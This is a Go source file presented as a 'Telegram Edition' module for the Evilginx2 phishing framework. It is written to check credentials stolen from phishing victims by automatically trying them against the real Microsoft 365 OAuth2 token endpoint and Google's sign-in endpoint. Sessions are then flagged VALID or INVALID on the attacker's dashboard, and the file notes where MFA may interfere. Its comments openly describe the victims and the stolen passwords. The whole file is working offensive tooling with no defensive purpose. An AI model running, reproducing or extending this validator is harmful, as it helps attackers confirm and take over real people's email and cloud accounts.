// core/validator.go
// Login Credential Validator for Evilginx2
//
// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
//
// WHAT THIS DOES (baby steps):
//   After you capture a victim's username and password, this automatically
//   tries to log into the REAL website with those credentials. It then marks
//   the session as VALID or INVALID on your dashboard.
//
//   Supported services right now:
//     - Microsoft 365 / Outlook / Office365 / Azure
//     - Google / Gmail
//   (More services can be added easily by adding new validate* methods.)

package core

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
	
)

// ValidationResult holds the result of a credential validation attempt.
type ValidationResult struct {
	Valid      bool   `json:"valid"`       // true if credentials worked
	Service    string `json:"service"`     // which service was tested
	CheckedAt  int64  `json:"checked_at"`  // unix timestamp
	StatusCode int    `json:"status_code"` // HTTP status from login attempt
	ErrorMsg   string `json:"error,omitempty"` // error message if something went wrong
}

// CredentialValidator checks if captured credentials work against a real service.
type CredentialValidator struct {
	client *http.Client
}

// NewCredentialValidator creates a Validator that makes real HTTP requests
// to test stolen credentials.
func NewCredentialValidator() *CredentialValidator {
	return &CredentialValidator{
		client: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// Validate checks the given username and password against the specified service.
// Returns a ValidationResult saying whether the credentials are valid.
func (cv *CredentialValidator) Validate(username, password, service string) *ValidationResult {
	result := &ValidationResult{
		Service:   service,
		CheckedAt: time.Now().Unix(),
	}

	if username == "" || password == "" {
		result.ErrorMsg = "empty username or password"
		return result
	}

	switch strings.ToLower(service) {
	case "microsoft", "office365", "outlook", "live", "azure":
		cv.validateMicrosoft(username, password, result)
	case "google", "gmail":
		cv.validateGoogle(username, password, result)
	default:
		result.ErrorMsg = fmt.Sprintf("unsupported service: %s", service)
	}

	return result
}

// validateMicrosoft tries logging into Microsoft 365 with the captured
// credentials using the OAuth2 resource owner password credentials grant.
func (cv *CredentialValidator) validateMicrosoft(username, password string, result *ValidationResult) {
	loginURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	formData := url.Values{
		"client_id": {"00000000-0000-0000-c000-000000000000"},
		"grant_type": {"password"},
		"username":   {username},
		"password":   {password},
		"scope":      {"openid profile email offline_access"},
	}

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(formData.Encode()))
	if err != nil {
		result.ErrorMsg = fmt.Sprintf("request creation error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := cv.client.Do(req)
	if err != nil {
		result.ErrorMsg = fmt.Sprintf("request failed: %v", err)
		return
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode == 200 && strings.Contains(bodyStr, "access_token") {
		result.Valid = true
	} else if strings.Contains(bodyStr, "invalid_grant") || strings.Contains(bodyStr, "invalid_client") {
		result.Valid = false
	} else if resp.StatusCode == 200 {
		result.Valid = true
		result.ErrorMsg = "partial: MFA may be required"
	} else {
		result.Valid = false
	}
}

// validateGoogle tries logging into Google with the captured credentials.
func (cv *CredentialValidator) validateGoogle(username, password string, result *ValidationResult) {
	identifyURL := "https://accounts.google.com/_/signin/sl/challenge"
	formData := url.Values{
		"Email":  {username},
		"Passwd": {password},
	}

	req, err := http.NewRequest("POST", identifyURL, strings.NewReader(formData.Encode()))
	if err != nil {
		result.ErrorMsg = fmt.Sprintf("request creation error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := cv.client.Do(req)
	if err != nil {
		result.ErrorMsg = fmt.Sprintf("request failed: %v", err)
		return
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode == 302 || resp.StatusCode == 303 {
		result.Valid = true
	} else if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(bodyStr), "password") {
		result.Valid = true
	} else {
		result.Valid = false
	}
}
